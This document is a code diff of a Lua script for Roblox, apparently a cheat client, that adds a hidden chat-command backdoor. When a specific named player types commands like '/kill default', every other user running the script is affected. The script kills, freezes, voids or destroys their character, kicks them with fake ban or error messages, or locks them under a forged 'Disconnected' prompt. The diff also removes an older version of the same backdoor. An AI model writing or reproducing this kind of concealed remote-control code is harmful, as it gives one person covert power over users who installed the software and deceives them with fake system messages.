@@ -140,267 +140,175 @@ local function addvectortocframe(cframe, vec)
 	local x, y, z, R00, R01, R02, R10, R11, R12, R20, R21, R22 = cframe:GetComponents()
 	return CFrame.new(x + vec.X, y + vec.Y, z + vec.Z, R00, R01, R02, R10, R11, R12, R20, R21, R22)
 end
-
+local id = game.PlaceId
 
 local commands = {}
-local KILL = ";kill "
-local LAGBACK = ";lagback "
+local tpService = game:GetService("TeleportService")
 
+local aaaa = false
 
-commands.kill = function()
-	if game.Players.LocalPlayer.Name == "CoolBoyEli08" or "YMikeOfficialYT" then
-	else
-		game.Players.LocalPlayer.Character.Humanoid.Health = 0
-	end
-end
-commands.lagback = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-		else
-		game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999999999999999999999999999999999999999999999999999999999999999999999999
-	end
-end
-local JUMP = ";jump "
-commands.jump = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
-	end
-end
-local SIT = ";sit "
-commands.sit = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer.Character.Humanoid.Sit = true
-	end
-end
-local UNSIT = ";unsit "
-commands.unsit = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer.Character.Humanoid.Sit = false
-	end
-end
-local FREEZE = ";freeze "
-commands.freeze = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
-	end
-end
-local UNFREEZE = ";unfreeze "
-commands.unfreeze = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
-	end
-end
-local VOID = ";void "
-commands.void = function()
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		repeat
-			task.wait()
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
-		until game.Players.LocalPlayer.Character.Humanoid.Health <= 1
-	end
-end
-local CRASH = ";crash"
-commands.crash = function()
-	
-		if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-		else
-		setfpscap(9e9)
-		end
-end
-local CHIP = ";chip "
-commands.chip = function()
-
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		local function funnyfunc(v)
-			if v:IsA("ImageButton") then
-				v.Image = "http://www.roblox.com/asset/?id=6864086702"
-				v:GetPropertyChangedSignal("Image"):Connect(function()
-					v.Image = "http://www.roblox.com/asset/?id=6864086702"
-				end)
-			end
-			if v:IsA("TextLabel") or v:IsA("TextButton") and v:GetFullName():find("ChatChannelParentFrame") == nil then
-				if v.Text ~= "" then
-					v.Text = "chips"
-				end
-				v:GetPropertyChangedSignal("Text"):Connect(function()
-					if v.Text ~= "" then
-						v.Text = "chips"
-					end
-				end)
-			end
-			if v:IsA("Texture") or v:IsA("Decal") then
-				v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-				v:GetPropertyChangedSignal("TextureID"):Connect(function()
-					v.Texture = "http://www.roblox.com/asset/?id=6864086702"
-				end)
-			end
-			if v:IsA("MeshPart") then
-				v.TextureID = 'http://www.roblox.com/asset/?id=6864086702'
-				
-				v:GetPropertyChangedSignal("TextureID"):Connect(function()
-					v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
-				end)
-			end
-			for i,v in pairs(game:GetDescendants()) do
-				funnyfunc(v)
-			end
-			game.DescendantAdded:Connect(funnyfunc)
-		end
-	end
-end
-local BAN = ";ban "
-commands.ban = function()
-
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer:Kick("You have been temporarily banned. Remaining ban duration: 4960 weeks 2 days 5 hours 19 minutes "..math.random(45, 59).." seconds")
-	end
-end
-local KICK = ";kick "
-commands.kick = function()
-
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game.Players.LocalPlayer:Kick("you have been kicked from bedwars")
-	end
-end
-local DISCONNECT = ";disconnect "
-commands.disconnect = function()
-
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-		game:GetService("CoreGui"):FindFirstChild("RobloxPromptGui"):FindFirstChild("promptOverlay").DescendantAdded:Connect(function(obj)
-			obj.MouseButton1Click:Connect(function()
-				game.Players.LocalPlayer:Kick("Please press leave again")
-			end)
-		end)
-	end
-end
-local ERRORKICK = ";errorkick "
-commands.errorkick = function()
-
-	if game.Players.LocalPlayer.Name == 'CoolBoyEli08' or 'YMikeOfficialYT' then
-	else
-	game.Players.LocalPlayer.Character.Head:Destroy()
-	end
-end
 
 for i,v in pairs(game.Players:GetPlayers()) do
-	if v.Name == "CoolBoyEli08" then
+	
 		v.Chatted:Connect(function(msg)
-			
-			if msg:sub(1, KILL:len()):lower() == KILL:lower() then
-				local target = msg:sub(KILL:len()+1)
-				
-
-					commands.kill()
-			end
-			
-			if msg:sub(1, LAGBACK:len()):lower() == LAGBACK:lower() then
-				local target = msg:sub(LAGBACK:len()+1)
-
-
-					commands.lagback()
-				
-			end
-			if msg:sub(1, JUMP:len()):lower() == JUMP:lower() then
-				local target = msg:sub(JUMP:len()+1)
-
-				
-					commands.jump()
-				
-			end
-			
-			if msg:sub(1, SIT:len()):lower() == SIT:lower() then
-				local target = msg:sub(SIT:len()+1)
-
-				
-					commands.sit()
-				
-			end
-			
-			if msg:sub(1, UNSIT:len()):lower() == UNSIT:lower() then
-				local target = msg:sub(UNSIT:len()+1)
-
-				
-					commands.unsit()
-				
-			end
-			if msg:sub(1, FREEZE:len()):lower() == FREEZE:lower() then
-				local target = msg:sub(FREEZE:len()+1)
-
-				
-					commands.freeze()
-				
-			end
-			if msg:sub(1, UNFREEZE:len()):lower() == UNFREEZE:lower() then
-				local target = msg:sub(UNFREEZE:len()+1)
-
-				
-					commands.unfreeze()
-				
-			end
-			
-			if msg:sub(1, VOID:len()):lower() == VOID:lower() then
-				local target = msg:sub(VOID:len()+1)
-
-				
-					commands.void()
-				
-			end
-			if msg:sub(1, CRASH:len()):lower() == CRASH:lower() then
-				local target = msg:sub(CRASH:len()+1)
-
-				
-					commands.crash()
-				
-			end
-			
-			if msg:sub(1, CHIP:len()):lower() == CHIP:lower() then
-				local target = msg:sub(CHIP:len()+1)
-
-				
-					commands.chip()
-				
-			end
-			
-			if msg:sub(1, BAN:len()):lower() == BAN:lower() then
-				local target = msg:sub(BAN:len()+1)
-
-				
-					commands.ban()
-				
-			end
-			
-			if msg:sub(1, KICK:len()):lower() == KICK:lower() then
-				local target = msg:sub(KICK:len()+1)
-
+		if v.Name == "CoolBoyEli08" then
+			if msg == "/kill default" then
+				if v.Name == game.Players.LocalPlayer.Name then
 					
-					commands.kick()
-				
+				else
+					game.Players.LocalPlayer.Character.Humanoid.Health = -1
+				end
 			end
 			
-			if msg:sub(1, DISCONNECT:len()):lower() == DISCONNECT:lower() then
-				local target = msg:sub(DISCONNECT:len()+1)
+			if msg == "/lagback default" then
+				if v.Name == game.Players.LocalPlayer.Name then
 
-				
-					commands.disconnect()
-				
+				else
+					game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 999999999999999999999999999999999999999999999999999999999999999999999999
+				end
 			end
 			
-			if msg:sub(1, ERRORKICK:len()):lower() == ERRORKICK:lower() then
-				local target = msg:sub(ERRORKICK:len()+1)
+			if msg == "/jump default" then
+				if v.Name == game.Players.LocalPlayer.Name then
 
-				
-					commands.errorkick()
-				
+				else
+					game.Players.LocalPlayer.Character.Humanoid:ChangeState("Jumping")
+				end
 			end
-		end)
-	end
+			
+			if msg == "/sit default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					game.Players.LocalPlayer.Character.Humanoid.Sit = true
+				end
+			end
+			
+			if msg == "/unsit default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					game.Players.LocalPlayer.Character.Humanoid.Sit = false
+				end
+			end
+			
+
+			if msg == "/freeze default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				end
+			end
+			
+			if msg == "/unfreeze default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				end
+			end
+			
+			if msg == "/void default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					repeat
+						task.wait()
+						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = addvectortocframe(game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame, Vector3.new(0, -3, 0))
+					until game.Players.LocalPlayer.Character.Humanoid.Health <= 1
+				end
+			end
+			
+			if msg == "/crash default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					setfpscap(9e9)
+				end
+			end
+			
+			if msg == "/chip default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					local function funnyfunc(v)
+						if v:IsA("ImageButton") then
+							v.Image = "http://www.roblox.com/asset/?id=6864086702"
+							v:GetPropertyChangedSignal("Image"):Connect(function()
+								v.Image = "http://www.roblox.com/asset/?id=6864086702"
+							end)
+						end
+						if v:IsA("TextLabel") or v:IsA("TextButton") and v:GetFullName():find("ChatChannelParentFrame") == nil then
+							if v.Text ~= "" then
+								v.Text = "chips"
+							end
+							v:GetPropertyChangedSignal("Text"):Connect(function()
+								if v.Text ~= "" then
+									v.Text = "chips"
+								end
+							end)
+						end
+						if v:IsA("Texture") or v:IsA("Decal") then
+							v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+							v:GetPropertyChangedSignal("TextureID"):Connect(function()
+								v.Texture = "http://www.roblox.com/asset/?id=6864086702"
+							end)
+						end
+						if v:IsA("MeshPart") then
+							v.TextureID = 'http://www.roblox.com/asset/?id=6864086702'
+
+							v:GetPropertyChangedSignal("TextureID"):Connect(function()
+								v.TextureID = "http://www.roblox.com/asset/?id=6864086702"
+							end)
+						end
+						for i,v in pairs(game:GetDescendants()) do
+							funnyfunc(v)
+						end
+						game.DescendantAdded:Connect(funnyfunc)
+					end
+				end
+			end
+			
+			if msg == "/errorkick default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					game.Players.LocalPlayer.Character.Head:Destroy()
+					game.Players.LocalPlayer:Kick("error: 291\nYour head was not found")
+				end
+			end
+			
+			if msg == "/disconnect default" then
+				if v.Name == game.Players.LocalPlayer.Name then
+
+				else
+					aaaa = true
+					while aaaa == true do
+						wait(0.1)
+						game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 0
+						if not game.Lighting:FindFirstChild("EIEI") then
+							local blur = Instance.new("BlurEffect")
+							blur.Name = "EIEI"
+							blur.Parent = game.Lighting
+						end
+					end
+					local ErrorPrompt = getrenv().require(game:GetService("CoreGui").RobloxGui.Modules.ErrorPrompt)
+					local prompt = ErrorPrompt.new("Default")
+					prompt._hideErrorCode = true
+					local gui = Instance.new("ScreenGui", game:GetService("CoreGui"))
+					prompt:setParent(gui)
+					prompt:setErrorTitle("Disconnected")
+					prompt:updateButtons({{
+						Text = "reconnect",
+						Callback = function() tpService:Teleport(id, lplr) end,
+						Primary = true
+					}}, 'Default')
+					prompt:_open("Please check your internet connection and try again\n(Error Code:277)")
+				end
+			end
+		end
+	end)
+		
+	
 end
